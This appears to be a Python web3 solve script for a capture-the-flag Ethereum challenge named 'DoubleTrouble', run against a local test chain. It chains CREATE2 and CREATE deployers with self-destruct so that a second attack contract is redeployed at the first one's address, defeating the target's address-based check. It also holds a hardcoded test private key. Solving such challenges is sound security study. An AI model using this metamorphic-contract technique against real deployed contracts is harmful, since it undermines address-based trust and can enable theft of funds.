RPC_URL = "http://localhost:1234"

user_infos = {
    "PrivateKey": "0xf5b3730835b14e41267f6c32eb3ae329bf574a71cf8560ce2b293e65eddd2d35",
    "setupAddress": "0x0CA087B2523aCC4CE521A3F7074e9F052dF68677",
    "targetAddress": "0x1206eD8e565D130E90F9a9cce4aAe5008Cc75323"
}

from web3 import Web3, AsyncWeb3
from solcx import compile_source, install_solc
from eth_utils import keccak, to_checksum_address
import rlp


# Connect to the RPC
w3 = Web3(Web3.HTTPProvider(RPC_URL))
assert w3.is_connected(), "Not connected to the blockchain"

# Add account from private key
account = w3.eth.account.from_key(user_infos['PrivateKey'])
print(f"Account: {account.address}")
print(f"Balance: {Web3.from_wei(w3.eth.get_balance(account.address),'ether')}")

######################
# COMPILE Challenge #
######################

with open('Setup.sol','r') as f : 
    source_code = f.read() 

compiled_sol = compile_source(source_code, solc_version='0.8.26')  
print(f"Compiled classes : {compiled_sol.keys()}")

# Prepare the contract deployment transaction
abi = compiled_sol['<stdin>:Setup']['abi']
bytecode = compiled_sol['<stdin>:Setup']['bin']

# Load the setup contract
setup_contract = w3.eth.contract(address=user_infos['setupAddress'], abi=compiled_sol['<stdin>:Setup']['abi'])
print(f"Contract: {setup_contract.all_functions()}")


# Load the DoubleTrouble contract
target_contract = w3.eth.contract(address=user_infos['targetAddress'], abi=compiled_sol['DoubleTrouble.sol:DoubleTrouble']['abi'])
print(f"Contract: {target_contract.all_functions()}")

print(f"DoubleTrouble is at {user_infos['targetAddress']}")


############################
# COMPILE DEPLOYER CREATE2 #
############################

with open('DeployerCreate2.sol','r') as f : 
    source_code = f.read() 

compiled_deployer_create2 = compile_source(source_code, solc_version='0.8.26')  
print(f"Compiled classes : {compiled_deployer_create2.keys()}")

# Prepare the contract deployment transaction
abi_deployer_create2 = compiled_deployer_create2['<stdin>:DeployerCreate2']['abi']
bytecode_deployer_create2 = compiled_deployer_create2['<stdin>:DeployerCreate2']['bin']

###########################
# COMPILE DEPLOYER CREATE #
###########################

with open('DeployerCreate.sol','r') as f : 
    source_code = f.read() 

compiled_deployer_create = compile_source(source_code, solc_version='0.8.26')  
print(f"Compiled classes : {compiled_deployer_create.keys()}")

# Prepare the contract deployment transaction
abi_deployer_create = compiled_deployer_create['<stdin>:DeployerCreate']['abi']
bytecode_deployer_create = compiled_deployer_create['<stdin>:DeployerCreate']['bin']


#######################
# COMPILE TRANSIENT 1 #
#######################

with open('Transient1.sol','r') as f : 
    source_code = f.read() 

compiled_transient1 = compile_source(source_code, solc_version='0.8.26')  
print(f"Compiled classes : {compiled_transient1.keys()}")

# Prepare the contract deployment transaction
abi_transient1 = compiled_transient1['<stdin>:Transient1']['abi']
bytecode_transient1 = compiled_transient1['<stdin>:Transient1']['bin']

#######################
# COMPILE TRANSIENT 2 #
#######################

with open('Transient2.sol','r') as f : 
    source_code = f.read() 

compiled_transient2 = compile_source(source_code, solc_version='0.8.26')  
print(f"Compiled classes : {compiled_transient2.keys()}")

# Prepare the contract deployment transaction
abi_transient2 = compiled_transient2['<stdin>:Transient2']['abi']
bytecode_transient2 = compiled_transient2['<stdin>:Transient2']['bin']

##########################
# DEPLOY DEPLOYERCREATE2 #
##########################

# Deploy the contract
transaction = w3.eth.contract(abi=abi_deployer_create2, bytecode=bytecode_deployer_create2).constructor().build_transaction({
    'from': account.address,
    'nonce': w3.eth.get_transaction_count(account.address)
})
signed_txn = w3.eth.account.sign_transaction(transaction, private_key=account._private_key)
txn_hash = w3.eth.send_raw_transaction(signed_txn.raw_transaction)
txn_receipt = w3.eth.wait_for_transaction_receipt(txn_hash)
contract_address = txn_receipt.contractAddress
# Load the contract
contract_deployer_create2 = w3.eth.contract(address=contract_address, abi=abi_deployer_create2)
print(f"DeployerCreate2 deployed at {contract_address}")
print(f"Contract: {contract_deployer_create2.all_functions()}")


#########################
# Deploy DeployerCreate #
#########################

approve_txn = contract_deployer_create2.functions.create2(bytes.fromhex(bytecode_deployer_create),0x1337).transact({'from': account.address})
address_deployer_create = contract_deployer_create2.functions.lastDeployedAddress.call()
print(f"DeployerCreate deployed at {address_deployer_create}")

# Load the contract
contract_deployer_create = w3.eth.contract(address=address_deployer_create, abi=abi_deployer_create)
print(f"Contract: {contract_deployer_create.all_functions()}")

#####################
# Deploy Transient1 #
#####################

approve_txn = contract_deployer_create.functions.create(bytes.fromhex(bytecode_transient1)).transact({'from': account.address})
address_transient1 = contract_deployer_create.functions.lastDeployedAddress.call()
print(f"Transient1 deployed at {address_transient1}")

# Load the contract
contract_transient1 = w3.eth.contract(address=address_transient1, abi=abi_transient1)
print(f"Contract: {contract_transient1.all_functions()}")

###################
# Call transient1 #
###################

approved_txn = contract_transient1.functions.attack(user_infos['targetAddress']).transact({'from': account.address})
print("Calling transient1 attack()")

#########################################
# Destroy deployercreate and transient1 #
#########################################

approved_txn = contract_transient1.functions.destroy().transact({'from': account.address})
print("Transient1 contract is destroyed")

approved_txn = contract_deployer_create.functions.destroy().transact({'from': account.address})
print("DeployerCreate contract is destroyed")


#########################
# Deploy DeployerCreate #
#########################

approve_txn = contract_deployer_create2.functions.create2(bytes.fromhex(bytecode_deployer_create),0x1337).transact({'from': account.address})
address_deployer_create = contract_deployer_create2.functions.lastDeployedAddress.call()
print(f"DeployerCreate deployed at {address_deployer_create}")

# Load the contract
contract_deployer_create = w3.eth.contract(address=address_deployer_create, abi=abi_deployer_create)
print(f"Contract: {contract_deployer_create.all_functions()}")

#####################
# Deploy Transient2 #
#####################

approve_txn = contract_deployer_create.functions.create(bytes.fromhex(bytecode_transient2)).transact({'from': account.address})
address_transient2 = contract_deployer_create.functions.lastDeployedAddress.call()
print(f"Transient2 deployed at {address_transient2}")

# Load the contract
contract_transient2 = w3.eth.contract(address=address_transient2, abi=abi_transient2)
print(f"Contract: {contract_transient2.all_functions()}")

###################
# Call transient1 #
###################

approved_txn = contract_transient2.functions.attack(user_infos['targetAddress']).transact({'from': account.address})
print("Calling transient2 attack()")
############
# Solve it #
############

approved_txn = target_contract.functions.checkSolved(address_transient2).transact({'from': account.address})

#######################
# Verify it is solved #
#######################

print(target_contract.functions.isSolved().call())

print(target_contract.functions.state(address_transient2,0).call().hex())
print(target_contract.functions.state(address_transient2,1).call().hex())



